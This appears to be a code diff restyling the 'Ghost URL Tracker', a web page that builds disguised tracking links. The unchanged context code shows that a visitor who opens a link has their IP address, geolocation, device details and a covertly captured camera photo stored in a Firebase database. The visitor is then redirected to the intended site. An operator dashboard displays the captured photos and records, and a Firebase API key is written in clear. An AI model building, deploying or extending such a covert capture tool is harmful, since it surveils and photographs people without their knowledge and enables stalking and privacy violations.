@@ -3,49 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ghost URL Tracker</title>
+    <title>Ghost ☠ Hacker Tracker</title>
     <style>
-        :root {
-            --primary: #4285f4;
-            --danger: #ea4335;
-            --success: #34a853;
-            --light: #f8f9fa;
-            --dark: #202124;
-        }
-        
+        /* Matrix Background Animation */
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            line-height: 1.6;
             margin: 0;
-            padding: 20px;
-            background-color: #f5f5f5;
-            color: var(--dark);
+            padding: 0;
+            overflow-x: hidden;
+            position: relative;
+            font-family: 'Courier New', monospace;
         }
         
-        .container {
-            max-width: 1000px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background-color: black;
             overflow: hidden;
         }
         
-        header {
-            background: linear-gradient(135deg, var(--primary), #3367d6);
-            color: white;
-            padding: 25px;
-            text-align: center;
+        .matrix-column {
+            position: absolute;
+            top: 0;
+            width: 15px;
+            color: #00ff41;
+            font-size: 18px;
+            writing-mode: vertical-rl;
+            text-orientation: upright;
+            text-shadow: 0 0 5px #00ff41;
+            animation: matrix-fall linear infinite;
+            opacity: 0.8;
         }
         
-        .content {
-            padding: 25px;
+        @keyframes matrix-fall {
+            0% { transform: translateY(-100vh); }
+            100% { transform: translateY(100vh); }
         }
         
-        .input-section {
-            background: var(--light);
+        /* Main Container Styles */
+        .container {
+            max-width: 1000px;
+            margin: 20px auto;
+            background-color: rgba(0, 0, 0, 0.85);
+            border: 1px solid #00ff41;
+            border-radius: 5px;
+            box-shadow: 0 0 15px #00ff41;
+            color: #00ff41;
             padding: 20px;
-            border-radius: 8px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        header {
+            text-align: center;
+            padding: 20px;
+            border-bottom: 1px solid #00ff41;
+            margin-bottom: 20px;
+        }
+        
+        h1, h2, h3, h4 {
+            color: #00ff41;
+            text-shadow: 0 0 5px #00ff41;
+        }
+        
+        h1 {
+            font-size: 2.5em;
+            margin: 0;
+        }
+        
+        /* Input Section Styles */
+        .input-section {
+            background-color: rgba(0, 20, 0, 0.5);
+            padding: 20px;
+            border-radius: 5px;
+            border: 1px solid #008f11;
             margin-bottom: 30px;
         }
         
@@ -58,9 +92,17 @@
         input[type="text"] {
             flex: 1;
             padding: 12px 15px;
-            border: 1px solid #ddd;
+            background-color: rgba(0, 0, 0, 0.7);
+            border: 1px solid #008f11;
             border-radius: 4px;
             font-size: 16px;
+            color: #00ff41;
+            font-family: 'Courier New', monospace;
+        }
+        
+        input[type="text"]::placeholder {
+            color: #008f11;
+            opacity: 0.7;
         }
         
         button {
@@ -69,34 +111,37 @@
             border-radius: 4px;
             cursor: pointer;
             font-size: 16px;
-            font-weight: 500;
+            font-weight: bold;
             transition: all 0.3s;
+            font-family: 'Courier New', monospace;
         }
         
         .btn-primary {
-            background-color: var(--primary);
-            color: white;
+            background-color: #008f11;
+            color: black;
         }
         
         .btn-danger {
-            background-color: var(--danger);
+            background-color: #ff0033;
             color: white;
         }
         
         .btn-success {
-            background-color: var(--success);
-            color: white;
+            background-color: #00ff41;
+            color: black;
         }
         
         button:hover {
             opacity: 0.9;
             transform: translateY(-2px);
+            box-shadow: 0 0 10px currentColor;
         }
         
         .result-box {
-            background: var(--light);
+            background-color: rgba(0, 20, 0, 0.5);
             padding: 20px;
-            border-radius: 8px;
+            border-radius: 5px;
+            border: 1px solid #008f11;
             margin-top: 20px;
             display: none;
         }
@@ -107,36 +152,58 @@
             margin: 15px 0;
         }
         
+        .url-display input {
+            background-color: rgba(0, 0, 0, 0.7);
+            color: #00ff41;
+            border: 1px solid #008f11;
+        }
+        
+        /* Results Section Styles */
         .controls {
             display: flex;
             gap: 10px;
             margin-bottom: 20px;
         }
         
+        .results-container {
+            overflow-x: auto;
+            border: 1px solid #008f11;
+            border-radius: 5px;
+            margin-top: 20px;
+            background-color: rgba(0, 0, 0, 0.7);
+        }
+        
         table {
             width: 100%;
             border-collapse: collapse;
-            margin-top: 20px;
+            min-width: 800px;
         }
         
         th, td {
             padding: 12px 15px;
             text-align: left;
-            border-bottom: 1px solid #eee;
+            border-bottom: 1px solid #008f11;
         }
         
         th {
-            background-color: var(--light);
-            font-weight: 600;
+            background-color: rgba(0, 20, 0, 0.5);
+            font-weight: bold;
+            position: sticky;
+            top: 0;
         }
         
+        tr:hover {
+            background-color: rgba(0, 30, 0, 0.3);
+        }
+        
+        /* Modal Styles */
         .modal {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0, 0, 0, 0.9);
             display: none;
             justify-content: center;
             align-items: center;
@@ -144,14 +211,16 @@
         }
         
         .modal-content {
-            background: white;
+            background-color: rgba(0, 10, 0, 0.95);
             padding: 25px;
-            border-radius: 8px;
+            border-radius: 5px;
             width: 90%;
             max-width: 800px;
             max-height: 90vh;
             overflow: auto;
             position: relative;
+            border: 1px solid #00ff41;
+            box-shadow: 0 0 20px #00ff41;
         }
         
         .close-btn {
@@ -160,29 +229,41 @@
             right: 15px;
             font-size: 24px;
             cursor: pointer;
-            color: var(--dark);
+            color: #00ff41;
+            background: none;
+            border: none;
+        }
+        
+        .close-btn:hover {
+            color: #ff0033;
         }
         
         .json-viewer {
-            background: #f5f5f5;
+            background-color: rgba(0, 0, 0, 0.7);
             padding: 15px;
             border-radius: 4px;
-            font-family: monospace;
+            font-family: 'Courier New', monospace;
             white-space: pre-wrap;
             max-height: 60vh;
             overflow-y: auto;
             margin-top: 15px;
+            color: #00ff41;
+            border: 1px solid #008f11;
         }
         
         .photo-container {
             text-align: center;
             margin-bottom: 20px;
+            padding: 10px;
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 5px;
+            border: 1px solid #008f11;
         }
         
         .captured-photo {
             max-width: 100%;
             max-height: 300px;
-            border: 1px solid #ddd;
+            border: 1px solid #008f11;
             border-radius: 4px;
             margin-top: 10px;
         }
@@ -201,61 +282,87 @@
             display: none;
         }
         
+        /* Scrollbar styling */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: rgba(0, 10, 0, 0.5);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #008f11;
+            border-radius: 5px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #00ff41;
+        }
+        
+        /* Responsive adjustments */
         @media (max-width: 768px) {
             .input-group, .url-display, .controls {
                 flex-direction: column;
             }
+            
+            .container {
+                margin: 10px;
+                padding: 15px;
+            }
         }
     </style>
-    
-    <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 </head>
 <body>
+    <!-- Matrix Background -->
+    <div class="matrix-bg" id="matrix-bg"></div>
+
     <div class="container">
         <header>
-            <h1>Ghost URL Tracker</h1>
-            <p>Track clicks with hidden camera capture</p>
+            <h1>GHOST ☠ TRACKER</h1>
+            <p>SYSTEM INITIALIZED - READY FOR OPERATION</p>
         </header>
 
         <div class="content">
             <div class="input-section">
-                <h2>Create Tracking Link</h2>
+                <h2>CREATE TRACKING LINK</h2>
                 <div class="input-group">
-                    <input type="text" id="target-url" placeholder="Enter target URL (e.g., https://example.com)">
-                    <button id="generate-btn" class="btn-primary">Generate Link</button>
+                    <input type="text" id="target-url" placeholder="ENTER TARGET URL (HTTPS://EXAMPLE.COM)">
+                    <button id="generate-btn" class="btn-primary">GENERATE LINK</button>
                 </div>
                 <div class="result-box" id="tracking-result">
-                    <p>Your tracking link:</p>
+                    <p>YOUR TRACKING LINK:</p>
                     <div class="url-display">
                         <input type="text" id="tracking-url" readonly>
-                        <button id="copy-btn" class="btn-success">Copy</button>
+                        <button id="copy-btn" class="btn-success">COPY</button>
                     </div>
-                    <p><small>Share this link to track visitors</small></p>
+                    <p><small>SHARE THIS LINK TO INITIATE TRACKING</small></p>
                 </div>
             </div>
 
             <div class="tracking-results">
-                <h2>Tracking Results</h2>
+                <h2>TRACKING RESULTS</h2>
                 <div class="controls">
-                    <button id="refresh-btn" class="btn-primary">Refresh Data</button>
-                    <button id="clear-btn" class="btn-danger">Clear All Data</button>
+                    <button id="refresh-btn" class="btn-primary">REFRESH DATA</button>
+                    <button id="clear-btn" class="btn-danger">CLEAR ALL DATA</button>
                 </div>
-                <table id="results-table">
-                    <thead>
-                        <tr>
-                            <th>Time</th>
-                            <th>IP Address</th>
-                            <th>Location</th>
-                            <th>Device</th>
-                            <th>Actions</th>
-                        </tr>
-                    </thead>
-                    <tbody id="results-body">
-                        <!-- Results will be loaded here -->
-                    </tbody>
-                </table>
+                <div class="results-container">
+                    <table id="results-table">
+                        <thead>
+                            <tr>
+                                <th>TIME</th>
+                                <th>IP ADDRESS</th>
+                                <th>LOCATION</th>
+                                <th>DEVICE</th>
+                                <th>ACTIONS</th>
+                            </tr>
+                        </thead>
+                        <tbody id="results-body">
+                            <!-- Results will be loaded here -->
+                        </tbody>
+                    </table>
+                </div>
             </div>
         </div>
     </div>
@@ -269,12 +376,12 @@
     <!-- Modal for Details -->
     <div id="details-modal" class="modal">
         <div class="modal-content">
-            <span class="close-btn">&times;</span>
-            <h3>Detailed Tracking Data</h3>
+            <button class="close-btn">&times;</button>
+            <h3>DETAILED TRACKING DATA</h3>
             <div class="photo-container">
-                <h4>Captured Photo</h4>
-                <img id="captured-photo" class="captured-photo" src="" alt="Captured photo">
-                <p id="photo-timestamp"><small>No photo available</small></p>
+                <h4>CAPTURED IMAGE</h4>
+                <img id="captured-photo" class="captured-photo" src="" alt="CAPTURED PHOTO">
+                <p id="photo-timestamp"><small>IMAGE DATA NOT AVAILABLE</small></p>
             </div>
             <div id="tracking-details">
                 <!-- Tracking details will be inserted here -->
@@ -284,6 +391,31 @@
     </div>
 
     <script>
+    // Matrix Background Generation
+    function createMatrixEffect() {
+        const container = document.getElementById('matrix-bg');
+        const characters = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
+        const cols = Math.floor(window.innerWidth / 15);
+        
+        for (let i = 0; i < cols; i++) {
+            const col = document.createElement('div');
+            col.className = 'matrix-column';
+            col.style.left = `${i * 15}px`;
+            col.style.animationDuration = `${5 + Math.random() * 10}s`;
+            col.style.animationDelay = `${Math.random() * 5}s`;
+            
+            // Create falling characters
+            let content = '';
+            const length = 20 + Math.floor(Math.random() * 30);
+            for (let j = 0; j < length; j++) {
+                content += characters.charAt(Math.floor(Math.random() * characters.length));
+            }
+            
+            col.textContent = content;
+            container.appendChild(col);
+        }
+    }
+
     // Firebase configuration
     const firebaseConfig = {
         apiKey: "AIzaSyDVGNv1TJynxk--MC9dbYb3GpUhSgd4Kqs",
@@ -323,6 +455,7 @@
 
     // Initialize the application
     function init() {
+        createMatrixEffect();
         setupEventListeners();
         loadTrackingResults();
         checkForTrackingRequest();
@@ -347,14 +480,14 @@
         const targetUrl = elements.targetUrlInput.value.trim();
         
         if (!targetUrl) {
-            alert('Please enter a target URL');
+            alert('PLEASE ENTER A TARGET URL');
             return;
         }
         
         try {
             new URL(targetUrl);
         } catch {
-            alert('Invalid URL format. Please include http:// or https://');
+            alert('INVALID URL FORMAT. INCLUDE HTTP:// OR HTTPS://');
             return;
         }
         
@@ -376,7 +509,7 @@
     function copyToClipboard() {
         elements.trackingUrlInput.select();
         document.execCommand('copy');
-        alert('Link copied to clipboard!');
+        alert('LINK COPIED TO CLIPBOARD');
     }
 
     // Format JSON for display
@@ -397,7 +530,7 @@
             const data = snapshot.val();
             
             if (!data) {
-                elements.resultsBody.innerHTML = '<tr><td colspan="5">No tracking data available</td></tr>';
+                elements.resultsBody.innerHTML = '<tr><td colspan="5">NO TRACKING DATA AVAILABLE</td></tr>';
                 return;
             }
             
@@ -410,14 +543,14 @@
             elements.resultsBody.innerHTML = dataArray.map(item => `
                 <tr>
                     <td>${formatDate(item.timestamp)}</td>
-                    <td>${item.ip || 'Unknown'}</td>
+                    <td>${item.ip || 'UNKNOWN'}</td>
                     <td>
-                        ${item.location?.city || 'Unknown'}
+                        ${item.location?.city || 'UNKNOWN'}
                         ${item.latitude ? `<br><small>(${item.latitude}, ${item.longitude})</small>` : ''}
                     </td>
-                    <td>${item.device?.type || 'Unknown'}</td>
+                    <td>${item.device?.type || 'UNKNOWN'}</td>
                     <td>
-                        <button class="view-details" data-id="${item.id}">View Details</button>
+                        <button class="view-details" data-id="${item.id}">VIEW DETAILS</button>
                     </td>
                 </tr>
             `).join('');
@@ -429,8 +562,8 @@
                 });
             });
         } catch (error) {
-            console.error('Error loading data:', error);
-            elements.resultsBody.innerHTML = '<tr><td colspan="5">Error loading data</td></tr>';
+            console.error('ERROR LOADING DATA:', error);
+            elements.resultsBody.innerHTML = '<tr><td colspan="5">ERROR LOADING DATA</td></tr>';
         }
     }
 
@@ -445,29 +578,29 @@
             // Display photo if available
             if (data.cameraCapture?.imageData) {
                 elements.capturedPhoto.src = data.cameraCapture.imageData;
-                elements.photoTimestamp.innerHTML = `<small>Captured at: ${formatDate(data.cameraCapture.timestamp)}</small>`;
+                elements.photoTimestamp.innerHTML = `<small>CAPTURED AT: ${formatDate(data.cameraCapture.timestamp)}</small>`;
                 elements.capturedPhoto.style.display = 'block';
             } else {
                 elements.capturedPhoto.style.display = 'none';
-                elements.photoTimestamp.textContent = 'No photo available';
+                elements.photoTimestamp.textContent = 'NO IMAGE DATA AVAILABLE';
             }
             
             // Display other tracking details
             elements.trackingDetails.innerHTML = `
-                <h4>Tracking Details</h4>
-                <p><strong>Target URL:</strong> ${data.target || 'Unknown'}</p>
-                <p><strong>Time:</strong> ${formatDate(data.timestamp)}</p>
-                <p><strong>IP Address:</strong> ${data.ip || 'Unknown'}</p>
-                <p><strong>Location:</strong> ${data.location?.city || 'Unknown'} (${data.latitude || '?'}, ${data.longitude || '?'})</p>
-                <p><strong>Device:</strong> ${data.device?.type || 'Unknown'} (${data.device?.platform || 'Unknown'})</p>
-                <p><strong>User Agent:</strong> ${data.userAgent || 'Unknown'}</p>
+                <h4>TRACKING DETAILS</h4>
+                <p><strong>TARGET URL:</strong> ${data.target || 'UNKNOWN'}</p>
+                <p><strong>TIME:</strong> ${formatDate(data.timestamp)}</p>
+                <p><strong>IP ADDRESS:</strong> ${data.ip || 'UNKNOWN'}</p>
+                <p><strong>LOCATION:</strong> ${data.location?.city || 'UNKNOWN'} (${data.latitude || '?'}, ${data.longitude || '?'})</p>
+                <p><strong>DEVICE:</strong> ${data.device?.type || 'UNKNOWN'} (${data.device?.platform || 'UNKNOWN'})</p>
+                <p><strong>USER AGENT:</strong> ${data.userAgent || 'UNKNOWN'}</p>
             `;
             
             // Show raw JSON data
             elements.jsonContent.textContent = formatJSON(data);
             elements.detailsModal.style.display = 'flex';
         } catch (error) {
-            console.error('Error showing details:', error);
+            console.error('ERROR SHOWING DETAILS:', error);
         }
     }
 
@@ -485,7 +618,7 @@
             elements.cameraPreview.srcObject = cameraStream;
             return true;
         } catch (err) {
-            console.error('Camera access error:', err);
+            console.error('CAMERA ACCESS ERROR:', err);
             return false;
         }
     }
@@ -509,21 +642,21 @@
             
             return canvas.toDataURL('image/jpeg', 0.7);
         } catch (err) {
-            console.error('Photo capture error:', err);
+            console.error('PHOTO CAPTURE ERROR:', err);
             return null;
         }
     }
 
     // Clear All Data
     async function clearAllData() {
-        if (confirm('WARNING: This will delete ALL tracking data. Continue?')) {
+        if (confirm('WARNING: THIS WILL DELETE ALL TRACKING DATA. CONTINUE?')) {
             try {
                 await database.ref('trackingData').remove();
-                alert('All tracking data has been cleared');
+                alert('ALL TRACKING DATA HAS BEEN CLEARED');
                 loadTrackingResults();
             } catch (error) {
-                console.error('Error clearing data:', error);
-                alert('Failed to clear data');
+                console.error('ERROR CLEARING DATA:', error);
+                alert('FAILED TO CLEAR DATA');
             }
         }
     }
@@ -545,10 +678,10 @@
         const trackingData = {
             timestamp: firebase.database.ServerValue.TIMESTAMP,
             target: decodeURIComponent(targetUrl),
-            referrer: document.referrer || 'Direct',
+            referrer: document.referrer || 'DIRECT',
             userAgent: navigator.userAgent,
             device: {
-                type: /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+                type: /mobile/i.test(navigator.userAgent) ? 'MOBILE' : 'DESKTOP',
                 platform: navigator.platform,
                 screen: {
                     width: screen.width,
@@ -629,7 +762,7 @@
             // Redirect to target URL
             window.location.href = decodeURIComponent(targetUrl);
         } catch (error) {
-            console.error('Error in tracking process:', error);
+            console.error('ERROR IN TRACKING PROCESS:', error);
             window.location.href = decodeURIComponent(targetUrl);
         }
     }
